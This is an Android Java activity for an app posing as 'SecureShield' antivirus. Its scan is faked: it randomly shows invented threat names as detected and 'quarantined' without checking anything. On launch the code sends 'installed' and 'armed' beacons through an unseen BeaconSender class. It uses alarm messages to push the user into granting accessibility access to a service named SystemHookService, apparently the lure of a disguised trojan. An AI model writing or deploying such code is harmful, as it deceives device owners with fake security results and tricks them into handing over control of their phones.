package com.secureshield.antivirus;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import java.util.Random;

public class MainActivity extends Activity {
    private TextView statusText, scanResult, appsProtected;
    private ProgressBar progressBar;
    private Button scanButton, protectButton;
    private Handler handler = new Handler();
    private Random random = new Random();
    private int totalApps = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.statusText);
        scanResult = findViewById(R.id.scanResult);
        appsProtected = findViewById(R.id.appsProtected);
        progressBar = findViewById(R.id.progressBar);
        scanButton = findViewById(R.id.scanButton);
        protectButton = findViewById(R.id.protectButton);

        totalApps = getPackageManager().getInstalledPackages(0).size();
        appsProtected.setText("Apps Protected: " + totalApps);

        startService(new Intent(this, ShieldService.class));
        BeaconSender.send(this, "installed");

        if (isAccessibilityEnabled()) {
            statusText.setText("Real-Time Protection: ACTIVE");
            statusText.setTextColor(0xFF4CAF50);
            BeaconSender.send(this, "armed");
        } else {
            statusText.setText("PROTECTION DISABLED - Device at risk!");
            statusText.setTextColor(0xFFFF5722);
            scanResult.setText("Tap 'Enable Protection' to secure your device.");
        }

        scanButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) { performScan(); }
        });

        protectButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (isAccessibilityEnabled()) {
                    Toast.makeText(MainActivity.this, "Protection already active!", Toast.LENGTH_SHORT).show();
                } else {
                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                    Toast.makeText(MainActivity.this,
                            "Enable SecureShield in Accessibility Settings.",
                            Toast.LENGTH_LONG).show();
                }
            }
        });
    }

    private void performScan() {
        scanButton.setEnabled(false);
        progressBar.setVisibility(View.VISIBLE);
        scanResult.setText("Scanning " + totalApps + " apps...");
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                progressBar.setVisibility(View.GONE);
                scanButton.setEnabled(true);
                int chance = (totalApps > 30) ? 20 : 5;
                if (random.nextInt(100) < chance) {
                    String[] threats = {
                        "Android.Trojan.Spy.101",
                        "PUP.Clipboard.Hijack",
                        "Heur.Adware.General",
                        "Riskware.AddressSwap"
                    };
                    String found = threats[random.nextInt(threats.length)];
                    scanResult.setText("1 threat detected (" + found + "). Quarantined.");
                } else {
                    scanResult.setText("No threats found. System is clean.");
                }
            }
        }, 3000 + random.nextInt(2000));
    }

    private boolean isAccessibilityEnabled() {
        String service = getPackageName() + "/" + SystemHookService.class.getCanonicalName();
        try {
            String enabled = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return enabled != null && enabled.contains(service);
        } catch (Exception e) { return false; }
    }
}
